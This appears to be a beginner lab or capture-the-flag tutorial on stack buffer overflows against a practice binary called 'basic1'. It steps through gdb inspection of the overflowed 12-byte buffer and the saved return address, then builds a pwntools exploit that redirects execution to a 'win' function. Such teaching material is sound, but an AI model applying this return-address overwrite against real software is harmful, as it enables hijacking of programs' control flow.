
## `check_password()` writes user input into a 12 character buffer, but what happens if you try to write more than 12 characters?

### try running ./basic1 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
what output do you get?

### try running with gdb:

create a file named `input.txt`, then write `\n` into it (`\n` is the enter key)

run the following:
```
~ gdb ./basic1
(gdb) layout src
(gdb) break check_password
(gdb) run
```

run the following:
```
(gdb) display guess
(gdb) display i
```

Run `next` until you get to `i = 12`. When prompted for the password, type in `ABCDABCDABCD`

At this point, `guess` should be completely full, but we will still be writing data somewhere.

> Where is `guess` stored in ram? run `x/50bx &guess`. What is the output?

Run `next` until you get to the return statement. Where does the program return to? hint: type `info frame`, and look for the `saved rip`

Now, do the same thing again, but instead type `AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLM`

At the return statement, type `info frame`. What is the saved `rip`?

If we continue, what happens to the program here?

What input to the program should we give to call the win function?

Get the address of the win function: `print win`

Let's write a pwntools script:

```
from pwn import *

p = process('./basic1')
p.interactive()
```

now, let's modify it to use our input:

```
from pwn import *

p = process('./basic1')

print(p.readline().decode())

inp = b'AAAABBBBCCCC'
print(f'sending {inp}')
p.sendline(inp)

print(p.readline().decode())
```

now, let's make it jump to win:

```
from pwn import *

p = process('./basic1')

print(p.readline().decode())

win_addr = 0x401146
padding = b'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJK'
payload = padding + struct.pack('<Q', win_addr)
print(f'sending {payload}')
p.sendline(payload)

print(p.readline().decode())
```